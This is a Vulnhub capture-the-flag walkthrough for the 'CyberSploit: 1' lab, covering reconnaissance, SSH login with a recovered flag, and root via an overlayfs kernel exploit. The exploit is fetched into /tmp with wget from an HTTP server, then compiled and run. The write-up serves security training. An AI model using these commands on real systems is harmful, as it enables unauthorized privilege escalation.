# Cybersploit:1 ~Vulnhub Walkthrough
Here is Walkthrough of another boot2root challenge called “CyberSploit: 1”. It’s available at Vulnhub for penetration testing. This is an easy level lab. The credit for making this lab goes to cybersploit1. Let’s get started and learn how to successfully break it down. Level: Easy


## Scanning

**nmap 192.168.122.153**

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled.png)

**nmap -sV -A 192.168.122.153   (**Service version scanning**)**

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%201.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%201.png)

nikto -h http://192.168.122.153/

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%202.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%202.png)

Whatweb [http://192.168.122.153](http://192.168.122.153) (To check cms and programming used by target machine)

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%203.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%203.png)

## Enumeration

[http://192.168.122.153](http://192.168.122.153) (Open target in browser)

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%204.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%204.png)

Checking view-source and found username:itsskv in comment

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%205.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%205.png)

Running gobuster to find more directories and files

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%206.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%206.png)

Opening /hacker directory

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%207.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%207.png)

/robots.txt

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%208.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%208.png)

***Found base64 encoded string.

Lets decode it.

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%209.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%209.png)

***Found Flag1: cybersploit{[youtube.com/c/cybersploit](http://youtube.com/c/cybersploit)}

## Exploitation

Lets connect with ssh and using flag1 as password

**ssh itsskv@192.168.122.153**

password: **cybersploit{[youtube.com/c/cybersploit](http://youtube.com/c/cybersploit)}**

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2010.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2010.png)

***Successfully connected

ls 

cat flag2.txt

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2011.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2011.png)

Found another flag but it is encoded in binary so lets decode it from binary to text

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2012.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2012.png)

**flag2: cybersploit{https:t.me/cybersploit1}**

uname -a

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2013.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2013.png)

***3.13.0-32-generic is vulnerable and exploitable using overlay-fs privilege escalation, script is available on exploit-db

## Privilege escalation

Download script from exploit-db and Start python server.

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2014.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2014.png)

Download script in target machine.

cd /tmp

**wget http://192.168.122.153:8000/ofs.c**

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2015.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2015.png)

compile script using command

gcc ofs.c -o ofs

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2016.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2016.png)

Run script on target 

./ofs

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2017.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2017.png)

***Got shell of root user

cd /root 

ls -al

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2018.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2018.png)

cat finalflag.txt

![Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2019.png](Cybersploit%201%20~Vulnhub%20Walkthrough%203597d1429fa64b35b67cc37b342cb05f/Untitled%2019.png)
